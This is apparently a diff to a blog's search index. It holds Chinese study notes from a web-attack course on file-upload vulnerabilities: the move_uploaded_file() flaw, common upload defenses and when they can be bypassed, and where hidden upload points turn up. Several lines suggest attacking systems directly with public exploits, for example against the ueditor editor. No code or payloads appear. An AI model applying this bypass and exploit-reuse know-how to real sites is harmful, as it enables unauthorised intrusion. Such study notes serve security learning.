+<h2 id="12、函数缺陷"><a href="#12、函数缺陷" class="headerlink" title="12、函数缺陷"></a>12、函数缺陷</h2><p>函数缺陷:move_uploaded_file()</p>
+<p>必须保存名字我们可控就可利用这个漏洞</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/067&068-2.png"></p>
+<h1 id="二、实战遇到的情况"><a href="#二、实战遇到的情况" class="headerlink" title="二、实战遇到的情况"></a>二、实战遇到的情况</h1><p>参考:<a href="https://konwait12.github.io/my-kon-blog/posts/049web%E6%94%BB%E9%98%B2/">https://konwait12.github.io/my-kon-blog/posts/049web%E6%94%BB%E9%98%B2/</a></p>
+<p>1、执行权限</p>
+<p>文件上传后存储目录不给执行权限</p>
+<p>绕过条件：能控制上传文件存储目录</p>
+<p>2、解码还原</p>
+<p>数据做存储，解析固定（文件后缀名无关）</p>
+<p>文件上传后利用编码传输解码还原</p>
+<p>绕过：无法直接绕过</p>
+<p>3、分站存储</p>
+<p>upload.xiaodi8.com 上传</p>
+<p>images.xiaodi8.com 存储</p>
+<p>绕过：看存储的执行策略</p>
+<p>4、OSS对象</p>
+<p>Access控制-OSS对象存储-Bucket对象</p>
+<p>绕过：无法直接绕过</p>
+<h1 id="三、应用场景"><a href="#三、应用场景" class="headerlink" title="三、应用场景"></a><font style="color:#000000;">三、应用场景</font></h1><p><font style="color:#000000;">1</font><font style="color:#000000;">、注册用户上传地方</font></p>
+<p><font style="color:#000000;">2</font><font style="color:#000000;">、JS或API接口的代码</font></p>
+<p><font style="color:#000000;">3</font><font style="color:#000000;">、后台或其他管理页面</font></p>
+<p><font style="color:#000000;">4</font><font style="color:#000000;">、源码泄露或盲测文件</font></p>
+<p><font style="color:#000000;">5</font><font style="color:#000000;">、三方编辑器上传漏洞</font></p>
+<p><font style="color:#000000;">6</font><font style="color:#000000;">、特定的源码审计漏洞</font></p>
+<p><font style="color:#000000;">演示(笔记中不演示，因为也没什么必要)：</font></p>
+<p><font style="color:#000000;">JS或API接口代码</font></p>
+<p><font style="color:#000000;background-color:#81BBF8;">可能网站页面中没有上传文件的点，但是js中可能有这个功能代码，我们可以根据功能代码写一个上传表单，来测试这个功能点。</font></p>
+<p><font style="color:#000000;">三方编辑器上传漏洞</font></p>
+<p><font style="color:#000000;background-color:#81BBF8;">就是看加载的js文件有没有第三方编辑器，然后看编辑器报出的漏洞，例如ueditor</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/067&068-3.png"></p>
+<p><font style="background-color:#81BBF8;">比如这个例子，在js中看到了ueditor。利用exp直接打，就能打进去。</font></p>
+<p><font style="color:#000000;">特定的源码审计漏洞</font></p>
+<p><font style="color:#000000;background-color:#81BBF8;">就是前人栽树后人乘凉，看看这个系统是不是什么有名的系统，曾经报过这个漏洞，直接利用payload即可</font></p>
+]]></content>
+      <categories>
+        <category>小迪安全课程学习笔记(web攻防)</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第69天-文件包含&amp;LFI&amp;RFI&amp;伪协议条件&amp;编码算法&amp;无文件利用&amp;JAVA应用&amp;SRC复盘</title>
+    <url>/2026/09/10/%E7%AC%AC69%E5%A4%A9-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%9D%A1%E4%BB%B6-%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E6%97%A0%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8-JAVA%E5%BA%94%E7%94%A8-SRC%E5%A4%8D%E7%9B%98/</url>
+    <content><![CDATA[]]></content>
+  </entry>
 </search>
